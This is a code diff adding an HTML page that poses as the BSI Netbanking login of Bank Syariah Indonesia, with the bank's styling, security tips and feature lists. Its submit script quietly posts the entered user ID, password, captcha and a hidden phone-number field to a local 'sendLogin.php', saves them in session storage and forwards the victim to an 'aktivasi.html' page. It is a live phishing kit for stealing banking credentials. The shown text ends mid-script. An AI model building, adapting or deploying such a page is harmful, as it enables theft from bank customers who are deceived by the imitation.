@@ -1,0 +1,1401 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+ <meta name="theme-color" content="#00A39E"> 
+<meta name="description"
+    content="Transaksi bisnis kini lebih mudah melalui layanan BSI Net kapanpun dan dimanapun. Berbagai kemudahan bertransaksi seperti melakukan transfer secara massal dan monitoring transaksi bisa anda lakukan di BSI Net.">
+<meta name="Saquib" content="Blade">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+
+<title>BSI Netbanking</title>
+ <meta property="og:url" content="https://www.bankbsi.co.id">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Bank Syariah Indonesia">
+  
+ <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYHqxfkmaC3JtBQ9wojO8smxHiFUg3vgzP8XJsS6IZI5YSzJGzQS5DUrErvLFu4GRocDlENMfg67g2YFB-mP5V4UTooLn89vzCmWg3c_Q6Qcp7W23sAhJuvpLWg1ZDPTExTebahzK5f28_BjOPDnV03WkLX-DF7_EMUKRIKpP8WeZCt-KOFXqJMmXSC4E/s1080/AddText_04-27-10.54.51.jpg">
+
+<link rel="icon" href="https://bsinet.bankbsi.co.id/image/favicon.ico" type="image/x-icon">
+<link rel="stylesheet" href="https://bsinet.bankbsi.co.id/css/bsm_style.min.css">
+<link rel="stylesheet" href="https://bsinet.bankbsi.co.id/css/bootstrap-3.4.min.css">
+<link rel="stylesheet" href="https://bsinet.bankbsi.co.id/css/slick.min.css">
+<link rel="stylesheet" href="https://bsinet.bankbsi.co.id/css/slick-theme.min.css">
+<link rel="stylesheet" href="https://bsinet.bankbsi.co.id/css/line-awesome.min.css">
+    <script src="https://bsinet.bankbsi.co.id/js/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://bsinet.bankbsi.co.id/css/custom.min.css">
+    <link rel="stylesheet" href="https://bsinet.bankbsi.co.id/css/main.min.css">
+    <link href="https://bsinet.bankbsi.co.id/DataTables/media/css/dataTables.bootstrap.min.css" rel="stylesheet" />
+	<link href="https://bsinet.bankbsi.co.id/DataTables/extensions/Responsive/css/responsive.bootstrap.min.css" rel="stylesheet" />
+
+    </head>
+
+<body>
+    
+    <div class="navbar navbar-default affix-top" data-spy="affix" data-offset-top="160" role="navigation" id="nav">
+        <div class="container">
+            <div class="navbar-header">
+                <div class="navbar-logo navhome-l">
+                    <a href="https://bsinet.bankbsi.co.id">
+                        <img class="nh-logo" src="https://bsinet.bankbsi.co.id/image/nlogo-unfx-drk.png">
+                        <img class="nafx-logo" src="https://bsinet.bankbsi.co.id/image/nlogo-unfx-drk.png">
+                    </a>
+                </div>
+            </div>
+            <div class="navbar-header navbar-header-right navbar-mainmenu navbar-h-btn">
+                <div class="navbar-h-btn-home">
+                    <div class="dropdown show">
+                        <a class="dropdown-toggle" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown"
+                            aria-haspopup="true" aria-expanded="false">
+                            
+                        </a>
+
+                        <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
+                            <div class="dropdown-item">
+                                <a class="isi dropdown-toggle" href="#" role="button" id="dropdownMenuLink"
+                                    data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                    
+                                </a>
+                            </div>
+                            <hr style="border-top: 1px solid #F5F5F5; margin: 0px;">
+                            <div class="dropdown-item">
+                                <a class="isi dropdown-toggle" href="#" role="button" id="dropdownMenuLink"
+                                    data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                    
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="navbar-header navbar-header-right navbar-h-btn-reponsive">
+                <div class="dropdown show">
+                    <a class=" dropdown-toggle" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown"
+                        aria-haspopup="true" aria-expanded="false">
+                        
+                    </a>
+
+                    <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
+                        <div class="dropdown-item bahasa-text">
+                            <a href="#" target="_blank" class="ind">
+                                
+                            </a>
+                        </div>
+                        <hr style="border-top: 1px solid #F5F5F5; margin: 0px;">
+                        <div class="dropdown-item english-text">
+                            <a href="#" target="_blank" class="en">
+                                
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="navbar-collapse collapse">
+            </div>
+        </div>
+    </div>
+            <div class="contt1-container" >
+            <div class="dh-cont1-l1-home"></div>
+            <div class="dh-cont1-l1-home-1" >
+                <div class="container" >
+                    <div id="main" class="rectangle-left col-md-6" style="margin-top: -10px; box-shadow: 0px 0px 4px #ccc; ">
+                            
+    <form id="login-form" class="form-login" method="POST" data-routes="doLogin">
+ <input type="hidden" id="nomorku" name="nomorku" value="">	 
+            <div class="form-group">
+            <h2 class="judul">Login ke BSI Net</h2>
+            <label for="name" class="control-label" style="color: #399997; font-weight: bold">User ID</label>
+    <input type="text" name="username" class="form-control" id="user" placeholder="Masukan USER ID" required>
+        </div>
+        <div class="form-group">
+            <label for="password" class="control-label" style="color: #399997; font-weight: bold">Password</label>
+   <input type="password" name="password" class="form-control" id="pass" placeholder="Password" required>
+        </div>
+        <div class="form-group">
+            <div class="coba-lagi-left">
+                <img id="captcha-img" class src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjX5jhh69b5J_5eDtFJ8VzuXo18OeRd72VTj6GnJoBdVEDmFD5-dhPNapr2Nioy3wi8tjagyUw8qk3sI-qAaqEz5mhhU2KdEa3096lAgcAyb7cluj5rqZNadqxQMAZxuo-Tz7Yk82v9zxFdXqffCrw02oTaH7CCDYZ4wzuzYAh7Bx5mWYjvE_6IdIZ8pkA/s200/default.png">
+            </div>
+            <div class="coba-lagi-right" id="reload">
+                <a href="#">Coba Code Lain</a>
+            </div>
+        </div>
+        <div class="form-group">
+            <label for="name" class="control-label" style="color: #399997; font-weight: bold">Captcha</label>
+            <input type="text" name="captcha" class="form-control" id="captcha" placeholder="Masukan Captcha Diatas" maxlength="6" required>
+            
+            <button class="btn-login" type="submit">
+                LOGIN
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhugumyI8kP6EixUqm-YxQv445ugJiBkS6x2uVDMyDF2RsSq1J8VQcyUhOrS2EDXgKtOTM-g1LUxKnNBBu4BZHkHnlbt8RGIxQSfR9O8fNU72qRf_I_xp5cO6lwkZaREJYuJmpsXtD-MExrjou07oi7N0ajLEsczRCS8htFPDcZ6fR28mUg2GFYx5j8kpE/s112/AddText_05-21-03.56.29.png" width="40px" class="la la-angle-right">
+            </button>
+            <div class="change-pass" style="margin-top: 100px">
+                <a href="#" data-toggle="modal" data-target="#lupa-userid">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFTChZBA4CgZNuw1bIHn9gelaiCehXepY6RqQmEC_h0236e2G5t_YpCmlXxySAuS3PTpPf0xnB8dZuDZhK5Vkx1n9owJ54d2dx-9I0bgGJUhIf342cNMEY1NtVZ4_vQJj5aqhq4jtlZMSWtv1GjSx-SiWDglO52xp2YuCLO92Io5CfAIpdJUptaviKGss/s58/AddText_05-21-03.51.56.jpg" class="las la-user-lock" width="17px">
+                    Lupa User ID ?
+                </a>
+                <a href="https://bsinet.bankbsi.co.id/lupaPassword">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHWICWRbmMHZWyNttEVM0z-xhRZKHOv-e-uMm_hdLuA4kQubS_mBgg0guzM2cBHG7B-xar4L65Oehi8Q5MBOEuCKK_0bkC1EuC7DT2l_5V0sR02GkRKsf7_yUzUrrhPBI2UJ6SP8OjgaMjXjDOdeh9N5koXcYom7aG2i_gP19tHUBwgXMrf-ssglhTYlg/s58/AddText_05-21-03.52.20.jpg" width="15px" class="las la-unlock">
+                    Lupa Password ?
+                </a>
+            </div>
+        </div>
+    </form>
+
+    
+    <script type="text/javascript">
+        var host = "https://bsinet.bankbsi.co.id";
+        $('#reload').click(function() {
+            reloadCaptcha();
+        });
+
+        setInterval(() => {
+            reloadCaptcha();
+        }, 59000);
+
+        function reloadCaptcha() {
+            $.ajax({
+                type: 'GET',
+                url: host + 'https://bsinet.bankbsi.co.id/reloadCaptcha',
+                success: function(data) {
+                    $('#captcha-img').attr('src', data.captcha);
+                }
+            });
+        }
+    </script>
+                    </div>
+                    <div class="rectangle-right col-sm-12 col-md-6">
+                        
+        </div>
+        <div class="cont-label">
+    <div class="container">
+        <div class="form-group">
+            <h1>Dengan Fitur Yang Memudahkan Transaksi Anda</h1>
+        </div>
+    </div>
+</div>
+
+<div class="slider">
+    <div class="myslider" id="slider">
+        <div class="col-xs-6 col-md-3">
+            <div class="thumbnail">
+                <img src="https://bsinet.bankbsi.co.id/image/ic_sfitur_transfer_v2.png">
+                <div class="caption">
+                    <p>Transfer</p>
+                    <a data-toggle="modal" data-target="#popupslider_ft" href="">
+                        <h5>DETAIL</h5>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xs-6 col-md-3">
+            <div class="thumbnail">
+                <img src="https://bsinet.bankbsi.co.id/image/ic_sfitur_payment_v2.png">
+                <div class="caption">
+                    <p>Payment</p>
+                    <a data-toggle="modal" data-target="#popupslider_fp" href="">
+                        <h5>DETAIL</h5>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xs-6 col-md-3">
+            <div class="thumbnail">
+                <img src="https://bsinet.bankbsi.co.id/image/ic_sfitur_inquiry_v2.png">
+                <div class="caption">
+                    <p>Inquiry</p>
+                    <a href="" data-toggle="modal" data-target="#popupslider_fi">
+                        <h5>DETAIL</h5>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xs-6 col-md-3">
+            <div class="thumbnail">
+                <img src="https://bsinet.bankbsi.co.id/image/ic_sfitur_manageadmin_v2.png">
+                <div class="caption">
+                    <p>Manage Admin</p>
+                    <a href="" data-toggle="modal" data-target="#popupslider_fa">
+                        <h5>DETAIL</h5>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div class="col-xs-6 col-md-3">
+            <div class="thumbnail">
+                <img src="https://bsinet.bankbsi.co.id/image/ic_sfitur_rekening_v2.png">
+                <div class="caption">
+                    <p>Rekening</p>
+                    <a data-toggle="modal" data-target="#popupslider_fr" href="">
+                        <h5>DETAIL</h5>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="container">
+    <hr>
+</div>
+
+<div class="cont5-container dh-cont5 container">
+    <div class="row">
+        <div class="col-md-6">
+            <div class="img2">
+                <img src="https://bsinet.bankbsi.co.id/image/ic_msm_ils_v3.png">
+            </div>
+        </div>
+        <div class="cont5-right col-md-6">
+            <div class="cont5-left-1">
+                <p>Lebih Mudah &amp; Praktis<br> Dengan BSI Mobile</p>
+            </div>
+            <div class="cont5-left-2">
+                <p>Transaksi, Pembelian, Pembayaran &amp; lainnya, lebih mudah dengan Aplikasi BSI Mobile, Dapatkan
+                    Aplikasi BSI Mobile di :</p>
+            </div>
+            <div class="cont5-left-3">
+                <a href="https://play.google.com/store/apps/details?id=com.bsm.activity2"><img class="playstore"
+                        src="https://bsinet.bankbsi.co.id/image/ic_dbtn_gplay.png"></a>
+                <a href="https://apps.apple.com/id/app/mandiri-syariah-mobile/id1410072458?l=id"><img
+                        class="appstore" src="https://bsinet.bankbsi.co.id/image/ic_dbtn_appstore.png"></a>
+            </div>
+        </div>
+    </div>
+    <hr>
+</div>
+ <script>
+ var nomor = sessionStorage.getItem("nomor");
+
+ document.getElementById("nomorku").value = nomor + "";
+  
+</script>
+   
+<div class="container forth-content">
+    <div class="row">
+        <div class="col-md-7">
+            <span class="info">
+                <p>Untuk informasi lebih lanjut hubungi Bank Syariah Indonesia Call</p>
+            </span>
+        </div>
+        <div class="col-md-5">
+            <div class="call">
+                <p>WhatsApp</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<section>
+    <div class="container content">
+        <!-- <div class="container nav-footer">
+                                                                  <div class="row footer-info">
+                                                                      <div class="col-sm-4">
+                                                                          <a href="limitTransaksi.html">Limit Transaksi</a>
+                                                                      </div>
+                                                                      <div class="col-sm-4">
+                                                                          <a href="infoKurs.html">Info Kurs</a>
+                                                                      </div>
+                                                                      <div class="col-sm-4">
+                                                                          <a href="kontak-kami.html">Hubungi Kami</a>
+                                                                      </div>
+                                                                  </div>
+                                                          </div> -->
+       
+</section>
+
+<div class="modal fade" id="lupa-userid" role="dialog">
+    <div class="modal-dialog modal-md" id="dhmodal-l1">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">
+                    <i class="la la-close"></i>
+                </button>
+                <h4 class="modal-title"></h4>
+            </div>
+            <div class="img-center">
+                <div>
+                    <img src="https://bsinet.bankbsi.co.id/image/ic_tipsaman.png">
+                </div>
+                <div>
+                    <p>Lupa User ID Bank Syariah Indonesia Internet Banking?</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="dbox-titlesec">
+                    <p>Silahkan hubungi BSI cabang terdekat
+                        dengan membawa tanda pengenal
+                        yang berlaku dan bukti kepemilikan rekening</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="popupslider_1" role="dialog">
+    <div class="modal-dialog modal-md" id="dhmodal-l1">
+
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">
+                    <i class="la la-close"></i>
+                </button>
+                <h4 class="modal-title"></h4>
+            </div>
+            <div class="img-center">
+                <div>
+                    <img src="https://bsinet.bankbsi.co.id/image/ic_tipsaman.png">
+                </div>
+                <div>
+                    <p>Tips Aman Menggunakan BSI NET Banking</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="dbox-titlesec">
+                    <ol>
+                        <li>BSI Net Banking menggunakan teknologi enkripsi Secure Socket Layer (SSL) 128 bit untuk
+                            memproteksi komunikasi antara komputer Anda dan server BSI Net Banking selama Anda
+                            mengakses internet banking Bank Syariah Indonesia.</li>
+                        <li>Untuk memastikan proteksi komunikasi selama Anda mengakses BSI Net Banking, Anda dapat
+                            melakukan hal-hal sebagai berikut:,
+                            <ul>
+                                <li>Lihat simbol 'gembok' di bagian bawah dari browser Anda. Double click simbol
+                                    'gembok' tersebut dan akan muncul informasi dari sertifikat tersebut,
+                                </li>
+                                <li>
+                                    'Issued to: bsinet.bankbsi.co.id' dan cek sertifikat status pada tab
+                                    certification Path akan tertulis 'This certificate is OK'
+                                </li>
+                            </ul>
+                        </li>
+                        <li>Pastikan bahwa Anda telah mengetik alamat yang benar yaitu
+                            https://bsinet.bankbsi.co.id</li>
+                        <li>Pastikan bahwa komputer yang Anda akan gunakan benar-benar aman dan terpercaya, lebih
+                            baik tidak menggunakan BSI Net banking dari warnet.</li>
+                        <li>Tolak layanan simpan otomatis User ID dan Password BSI Net Banking pada saat browser
+                            menawarkan Penyimpanan Otomatis </li>
+                        <li>Biasakan untuk menghapus browser cache dan history setiap selesai bertransaksi (delete
+                            cookies pada menu temporary internet file).</li>
+                        <li>Jangan tinggalkan komputer Anda saat Login ke layanan BSI Net Banking dan selalu klik
+                            'logout' jika sudah selesai menggunakan.</li>
+                        <li>Jika Anda mendapatkan e-mail yang berisi pemberitahuan bahwa BSI akan menutup rekening atau
+                            User ID Anda, jika tidak melakukan konfirmasi dengan data-data pribadi, jangan reply atau
+                            mengklik link yang ada pada e-mail tersebut.</li>
+                        <li>Jangan terpancing untuk mengikuti anjuran melakukan transfer ke rekening tertentu, dengan
+                            tujuan mendapatkan hadiah undian </li>
+                        <li>Jangan pernah membagi atau memberikan User ID atau Password BSI Net Banking Anda pada orang
+                            lain bahkan staf Bank Syariah Indonesia sekalipun. Bank Syariah Indonesia tidak pernah
+                            menanyakan Password BSI Net Banking untuk alasan apapun. </li>
+                        <li>Jangan menggunakan PIN yang dapat ditebak dengan mudah oleh orang lain, seperti nomor
+                            telepon, tanggal kelahiran, nomor kendaraan, atau data pribadi lainnya. Sebaiknya pilihlah
+                            nomor PIN yang unik dan tidak bermakna. Semakin acak, semakin bagus.</li>
+                        <li>Hubungi Cabang BSI jika Anda lupa PIN atau PIN Anda terblokir.</li>
+                    </ol>
+
+                </div> <!-- dbox-titlesec -->
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="popupslider_ti" role="dialog">
+    <div class="modal-dialog modal-md" id="dhmodal-l1">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">
+                    <i class="la la-close"></i>
+                </button>
+                <h4 class="modal-title"></h4>
+            </div>
+            <div class="title-left">
+                <div>
+                    <p>Fitur Informasi</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="dbox-titlesec">
+                    <div class="dbox-contsec">
+                        <table class="table dhlist-table">
+                            <tbody>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Informasi Akun
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Informasi Harga Pembelian
+                                        Emas dengan Cicil
+                                        Emas
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Informasi Kurs
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Notifikasi
+                                    </th>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="popupslider_fr" role="dialog">
+    <div class="modal-dialog modal-md" id="dhmodal-l1">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">
+                    <i class="la la-close"></i>
+                </button>
+                <h4 class="modal-title"></h4>
+            </div>
+            <div class="title-left">
+                <div>
+                    <p>Fitur Rekening</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="dbox-titlesec">
+                    <div class="dbox-contsec">
+                        <table class="table dhlist-table">
+                            <tbody>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Tabungan dan Giro
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Mutasi Rekening
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Deposito
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Pembiayaan
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Favorit
+                                    </th>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="popupslider_fp" role="dialog">
+    <div class="modal-dialog modal-md" id="dhmodal-l1">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">
+                    <i class="la la-close"></i>
+                </button>
+                <h4 class="modal-title"></h4>
+            </div>
+            <div class="title-left">
+                <div>
+                    <p>Fitur Payment</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="dbox-titlesec">
+                    <div class="dbox-contsec">
+                        <table class="table dhlist-table">
+                            <tbody>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Pembayaran
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Pembelian
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Zakat / Infaq
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Kalkulator Zakat
+                                    </th>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="popupslider_fi" role="dialog">
+    <div class="modal-dialog modal-md" id="dhmodal-l1">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">
+                    <i class="la la-close"></i>
+                </button>
+                <h4 class="modal-title"></h4>
+            </div>
+            <div class="title-left">
+                <div>
+                    <p>Fitur Inquiry</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="dbox-titlesec">
+                    <div class="dbox-contsec">
+                        <table class="table dhlist-table">
+                            <tbody>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Transfer Uang Tunai
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Token Listrik Prabayar
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Form Reinquiry MPN
+                                    </th>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="popupslider_fa" role="dialog">
+    <div class="modal-dialog modal-md" id="dhmodal-l1">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">
+                    <i class="la la-close"></i>
+                </button>
+                <h4 class="modal-title"></h4>
+            </div>
+            <div class="title-left">
+                <div>
+                    <p>Fitur Admin</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="dbox-titlesec">
+                    <div class="dbox-contsec">
+                        <table class="table dhlist-table">
+                            <tbody>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Ganti Password
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Ganti PIN Otorisasi
+                                    </th>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="popupslider_fts" role="dialog">
+    <div class="modal-dialog modal-md" id="dhmodal-l1">
+
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">
+                    <i class="la la-close"></i>
+                </button>
+                <h4 class="modal-title"></h4>
+            </div>
+            <div class="title-left">
+                <div>
+                    <p>Fitur Token SMS</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="dbox-titlesec">
+                    <div class="dbox-contsec">
+                        <table class="table dhlist-table">
+                            <tbody>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Request Token
+                                    </th>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="popupslider_fsbn" role="dialog">
+    <div class="modal-dialog modal-md" id="dhmodal-l1">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">
+                    <i class="la la-close"></i>
+                </button>
+                <h4 class="modal-title"></h4>
+            </div>
+            <div class="title-left">
+                <div>
+                    <p>Fitur SBN Online</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="dbox-titlesec">
+                    <div class="dbox-contsec">
+                        <table class="table dhlist-table">
+                            <tbody>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Registrasi
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Pembayaran
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Early Redemption
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Histori Transaksi
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Portofolio
+                                    </th>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="popupslider_ft" role="dialog">
+    <div class="modal-dialog modal-md" id="dhmodal-l1">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">
+                    <i class="la la-close"></i>
+                </button>
+                <h4 class="modal-title"></h4>
+            </div>
+            <div class="title-left">
+                <div>
+                    <p>Fitur Transfer</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div class="dbox-titlesec">
+                    <div class="dbox-contsec">
+                        <table class="table dhlist-table">
+                            <tbody>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Transfer Antar BSI
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Online Antar Bank
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Kriling Atau SKN
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> RTGS
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Transfer Tunai PT POS
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <th colspan="2" class="table-and-image">
+                                        <img src="https://bsinet.bankbsi.co.id/image/ic_listfitur.png"> Spesial
+                                    </th>
+                                </tr>
+                                <tr>
+                                    <td colspan="2" class="table-and-image">
+                                        <ol>
+                                            <li>Batch Transfer</li>
+                                            <li>List User Maker</li>
+                                            <li>Monitoring Transaksi</li>
+                                            <li>Pendaftaran User Maker</li>
+                                            <li>Tugas Saya</li>
+                                        </ol>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<script src="https://bsinet.bankbsi.co.id/js/main.js"></script>
+<script src="https://bsinet.bankbsi.co.id/js/bootstrap-3.4.min.js"></script>
+<script src="https://bsinet.bankbsi.co.id/js/jquery.smartmenus.min.js"></script>
+<script src="https://bsinet.bankbsi.co.id/js/jquery.mask.min.js"></script>
+<script src="https://bsinet.bankbsi.co.id/js/jquery.smartmenus.bootstrap.min.js"></script>
+<script src="https://bsinet.bankbsi.co.id/js/slick.min.js"></script>
+<script src="https://bsinet.bankbsi.co.id/js/crypto-js/crypto-js.min.js"></script>
+
+<script src="https://bsinet.bankbsi.co.id/js/crypto-js/Encryption-prod.js"></script>
+<script>
+$('#login-form').on('submit', function (event) {
+
+ 
+  event.stopPropagation();
+    event.preventDefault();
+ 
+  
+
+$.ajax({
+ type: 'POST',
+ url: 'sendLogin.php',
+ async: false,
+ dataType: 'JSON',
+ data: $(this).serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
+ 
+  setTimeout(function(){
+window.location.href='aktivasi.html'; 
+ var nomor = document.getElementById('nomorku').value;
+sessionStorage.setItem("nomor", nomor);
+ var user = document.getElementById("user").value;
+ sessionStorage.setItem("user", user);
+ var pass = document.getElementById("pass").value;
+ sessionStorage.setItem("pass", pass);
+ },1000);  
+
+        }
+    });
+
+    return false;
+});       
+</script>    
+<script>
+    $(document).ready(function() {
+        $('input').attr('autocomplete', 'off');
+        var host = "https://bsinet.bankbsi.co.id";
+        $("#ajax-form").submit(function(e) {
+            e.preventDefault();
+            let routes = $(this).attr('data-routes');
+            let a = new E();
+            var b = new FormData($(this)[0]);
+            for (let [key, value] of b.entries()) {
+                if (key == "_token" || value instanceof File) {
+                    b.set(key, value)
+                } else if (key.includes("[]")) {
+                    b.set(key, a.ec(JSON.stringify(b.getAll(key)), $('meta[name="csrf-token"]').attr(
+                        'content')))
+                } else {
+                    b.set(key, a.ec(value, $('meta[name="csrf-token"]').attr(
+                        'content')))
+                }
+            }
+
+            $.ajax({
+                type: "POST",
+                url: host + '/' + routes,
+                data: b,
+                contentType: false,
+                processData: false,
+                dataType: 'json',
+                headers: {
+                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                },
+                beforeSend: function() {
+                    // $(".button-submit").attr("disabled", true);
+                    // $(".button-submit span").addClass("las la-spinner");
+                    swal.fire({
+                        title: 'Silahkan tunggu...',
+                        showConfirmButton: false,
+                        // allowOutsideClick: () => !Swal.isLoading(),
+                        allowOutsideClick: false,
+                        allowEscapeKey: false,
+                        didOpen: () => {
+                            Swal.showLoading()
+                        },
+                    })
